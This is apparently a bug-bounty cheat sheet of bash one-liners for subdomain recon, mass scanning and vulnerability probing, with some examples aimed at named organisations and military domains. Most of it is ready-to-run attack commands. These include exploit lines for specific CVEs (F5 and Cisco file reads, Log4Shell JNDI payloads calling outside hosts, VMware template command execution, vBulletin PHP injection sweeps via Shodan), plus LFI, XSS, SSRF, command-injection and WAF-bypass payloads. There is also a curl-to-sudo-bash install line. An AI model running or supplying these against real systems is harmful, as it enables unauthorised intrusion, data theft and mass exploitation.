To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output from chaos domain.com we need it to be treated as http or https, so we use httpx to get the results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output treated for import into jaeles, where he will scan using his templates. 

```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```

###  Using shodan to jaeles



```bash
domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts 
```

###  Search to files using assetfinder and ffuf



```bash
assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
```

###  HTTPX using new mode location and injection XSS using qsreplace.



```bash
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'
```

###  Grap internal juicy paths and do requests to them.



```bash
export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' | grep -v "http" | grep -v "http" | unfurl paths | anew | xargs -I@ -P50 sh -c 'echo $domain@ | httpx -silent -content-length'
```

###  Download to list bounty targets We inject using the sed .git/HEAD command at the end of each url.



```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

###  Using to findomain to SQLINJECTION.



```bash
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```

###  Jaeles scan to bugbounty targets.



```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```

###  JLDC domain search subdomain, using rush and jaeles.



```bash
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```

###  Chaos to search subdomains check cloudflareip scan port.



```bash
chaos -silent -d paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -title -silent
```
###  Search JS to domains file.



```bash
cat FILE TO TARGET | httpx -silent | subjs | anew
```

###  Search JS using assetfinder, rush and hakrawler.



```bash
assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
```

###  Search to CORS using assetfinder and rush



```bash
assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"'
```

###  Search to js using hakrawler and rush & unew



```bash
cat hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | unew hakrawlerHttpx'
```

###  XARGS to dirsearch brute force.



```bash
cat hosts | xargs -I@ sh -c 'python3 dirsearch.py -r -b -w path -u @ -i 200, 403, 401, 302 -e php,html,json,aspx,sql,asp,js' 
```

###  Assetfinder to run massdns.



```bash
assetfinder DOMAIN --subs-only | anew | massdns -r lists/resolvers.txt -t A -o S -w result.txt ; cat result.txt | sed 's/A.*//; s/CN.*// ; s/\..$//' | httpx -silent
```

###  Extract path to js



```bash
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u 
```

###  Find subdomains and Secrets with jsubfinder



```bash
cat subdomsains.txt | httpx --silent | jsubfinder search -s
```

###  Search domains to Range-IPS.



```bash
cat dod1 | awk '{print $1}' | xargs -I@ sh -c 'prips @ | hakrevdns -r 1.1.1.1' | awk '{print $2}' | sed -r 's/.$//g' | httpx -silent -timeout 25 | anew 
```

###  Search new's domains using dnsgen.



```bash
xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 10000 | anew newdomain
```

###  List ips, domain extract, using amass + wordlist



```bash
amass enum -src -ip -active -brute -d navy.mil -o domain ; cat domain | cut -d']' -f 2 | awk '{print $1}' | sort -u > hosts-amass.txt ; cat domain | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | sort -u > ips-amass.txt ; curl -s "https://crt.sh/?q=%.navy.mil&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt ; sed 's/$/.navy.mil/' dns-Jhaddix.txt_cleaned > hosts-wordlist.txt ; cat hosts-amass.txt hosts-crtsh.txt hosts-wordlist.txt | sort -u > hosts-all.txt
```
###  Search domains using amass and search vul to nuclei.



```bash
amass enum -passive -norecursive -d disa.mil -o domain ; httpx -l domain -silent -threads 10 | nuclei -t PATH -o result -timeout 30 
```

###  Verify to cert using openssl.



```bash
sed -ne 's/^\( *\)Subject:/\1/p;/X509v3 Subject Alternative Name/{
    N;s/^.*\n//;:a;s/^\( *\)\(.*\), /\1\2\n\1/;ta;p;q; }' < <(
    openssl x509 -noout -text -in <(
        openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' \
            -connect hackerone.com:443 ) )
```


###  Search domains using openssl to cert.



```bash
xargs -a recursivedomain -P50 -I@ sh -c 'openssl s_client -connect @:443 2>&1 '| sed -E -e 's/[[:blank:]]+/\n/g' | httpx -silent -threads 1000 | anew 
```

### Juicy Subdomains

```bash
subfinder -d target.com -silent | dnsprobe -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'
```

### from BufferOver.run

```bash
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u 
```

### from Riddler.io

```bash
curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

### from nmap

```bash
nmap --script hostmap-crtsh.nse target.com
```

### from CertSpotter

```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### from Archive

```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```

### from JLDC

```bash
curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### from crt.sh

```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

### from ThreatMiner

```bash
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' |grep -o "\w.*target.com" | sort -u
```

### from Anubis

```bash
curl -s "https://jldc.me/anubis/subdomains/target.com" | jq -r '.' | grep -o "\w.*target.com"
```

### from ThreatCrowd

```bash
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq -r '.subdomains' | grep -o "\w.*target.com"
```

### from HackerTarget

```bash
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"
```

### SubDomain Bruteforcing - ffuf

```bash
ffuf -u https://FUZZ.target.com -w dns.txt -v | grep "| URL |" | awk '{print $4}'
```

### Subdomain Takeover:

```bash
cat subs.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
```

### LFI:


```bash
cat hosts | gau |  gf lfi |  httpx  -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"

```bash
waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

```bash
cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n";done
```


### Open Redirect:


```bash
waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```

```bash
cat subs.txt| waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```

### SSRF:


```bash
cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
```

```bash
cat wayback.txt | grep "=" | qsreplace "burpcollaborator_link" >> ssrf.txt; ffuf -c -w ssrf.txt -u FUZZ
```

### XSS:

```bash
cat domains.txt | waybackurls | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
```

```bash
gau target.com grep '='| qsreplace hack\" -a | while read url;do target-$(curl -s -l $url | egrep -o '(hack" | hack\\")'); echo -e "Target : \e[1;33m $url\e[om" "$target" "\n -"; done I sed 's/hack"/[xss Possible] Reflection Found/g'
```

```bash
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(" 
```

```bash
cat targets.txt | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```

```bash
waybackurls target.com | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```

```bash
cat urls.txt | grep "=" | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
```

```bash
cat targets.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
```

```bash
cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
```

### Hidden Dirs:
```
dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt
```

```
ffuf -c -w urls.txt:FUZZ1 -w wordlist.txt:FUZZ2 -u FUZZ1/FUZZ2 -mc 200 -ac -recursion -v -of json -o output
```

### ffuf json to txt output
```
cat output.json | jq | grep -o '"url": ".*"' | grep -o 'https://[^"]*'
```

### Search for Sensitive files from Wayback
```
waybackurls domain.com| grep - -color -E "1.xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
```

```
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200
```


### SQLi:
```
cat subs.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 5 --risk 3
```

### Bypass WAF using TOR

```
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor
```

### CORS:

```
gau "http://target.com" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

### Prototype Pollution:

```
subfinder -d target.com -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```

### CVEs:

### CVE-2020-5902:

```
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```

### CVE-2020-3452:

```
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```

### CVE-2021-44228:
```
cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done
```

```
cat urls.txt | sed `s/https:///` | xargs -I {} echo `{}/${jndi:ldap://{}attacker.burpcollab.net}` >> lo4j.txt
```

### CVE-2022-0378:

```
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```

### CVE-2022-22954:

```
cat urls.txt | while read h do ; do curl -sk --path-as-is “$h/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/hosts")}”| grep "context" && echo "$h\033[0;31mV\n"|| echo "$h \033[0;32mN\n";done
```

### CVE-2022-41040:
```
ffuf -w "urls.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
```


### RCE:

```
cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent 
```

### vBulletin 5.6.2

```
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;

subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt; ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```


### Find JS Files:

```
gau -subs target.com |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
```

```
assetfinder target.com | waybackurls | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```

### Hidden Params in JS:

```
cat subdomains.txt | gauplus -subs -t 100 -random-agent | sort -u --version-sort | httpx -silent -threads 2000 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```

### Extract sensitive end-point in JS:

```
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```


### SSTI:

```
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
```


### HeartBleed

```
cat urls.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line; safe; done
```


### Scan IPs

```
cat my_ips.txt | xargs -L100 shodan scan submit --wait 0
```

### Portscan

```
naabu -l targets.txt -rate 3000 -retries 3 -warm-up-time 0 -rate 150 -c 50 -ports 1-65535 -silent -o out.txt
```

### Screenshots using Nuclei

```
nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
```

### IPs from CIDR

```
echo cidr | httpx -t 100 | nuclei -t ~/nuclei-templates/ssl/ssl-dns-names.yaml | cut -d " " -f7 | cut -d "]" -f1 |  sed 's/[//' | sed 's/,/\n/g' | sort -u 
```

### SQLmap Tamper Scripts - WAF bypass

```
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
 --no-cast --no-escape --dbs --random-agent
```

### Shodan Cli

```
shodan search Ssl.cert.subject.CN:"target.com" --field ip_str | httpx -silent | tee ips.txt
```

### ffuf txt output

```
ffuf -w wordlists.txt -u URL/FUZZ -r -ac -v &>> output.txt ; sed -i 's/\:\: Progress.*Errors.*\:\://g' output.txt ; sed -i 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' output.txt
```

### Ffuf json to only URL

```
cat ffuf.json | jq | grep "url" | sed 's/"//g' | sed 's/url://g' | sed 's/^ *//' | sed 's/,//g'
```

### Recon Oneliner from Stok

```
subfinder -d moonpay.com -silent | anew moonpay-subs.txt | dnsx -resp -silent | anew moonpay-alive-subs-ip.txt | awk '{print $1}' | anew moonpay-alive-subs.txt | naabu -top-ports 1000 -silent | anew moonpay-openports.txt | cut -d ":" -f1 | naabu -passive -silent | anew moonpay-openports.txt | httpx -silent -title -status-code -mc 200,403,400,500 | anew moonpay-web-alive.txt | awk '{print $1}' | gospider -t 10 -q -o moonpaycrawl | anew moonpay-crawled.txt | unfurl format %s://dtp | httpx -silent -title -status-code -mc 403,400,500 | anew moonpay-crawled-interesting.txt | awk '{print $1}' | gau --blacklist eot,svg,woff,ttf,png,jpg,gif,otf,bmp,pdf,mp3,mp4,mov --subs | anew moonpay-gau.txt | httpx -silent -title -status-code -mc 200,403,400,500 | anew moonpay-web-alive.txt | awk '{print $1}'| nuclei -eid expired-ssl,tls-version,ssl-issuer,deprecated-tls,revoked-ssl-certificate,self-signed-ssl,kubernetes-fake-certificate,ssl-dns-names,weak-cipher-suites,mismatched-ssl-certificate,untrusted-root-certificate,metasploit-c2,openssl-detect,default-ssltls-test-page,wordpress-really-simple-ssl,wordpress-ssl-insecure-content-fixer,cname-fingerprint,mx-fingerprint,txt-fingerprint,http-missing-security-headers,nameserver-fingerprint,caa-fingerprint,ptr-fingerprint,wildcard-postmessage,symfony-fosjrouting-bundle,exposed-sharepoint-list,CVE-2022-1595,CVE-2017-5487,weak-cipher-suites,unauthenticated-varnish-cache-purge,dwr-index-detect,sitecore-debug-page,python-metrics,kubernetes-metrics,loqate-api-key,kube-state-metrics,postgres-exporter-metrics,CVE-2000-0114,node-exporter-metrics,kube-state-metrics,prometheus-log,express-stack-trace,apache-filename-enum,debug-vars,elasticsearch,springboot-loggers -ss template-spray | notify -silent
```

### Update golang

```
curl https://raw.githubusercontent.com/udhos/update-golang/master/update-golang.sh|sudo bash
```

### Censys CLI

```
censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```
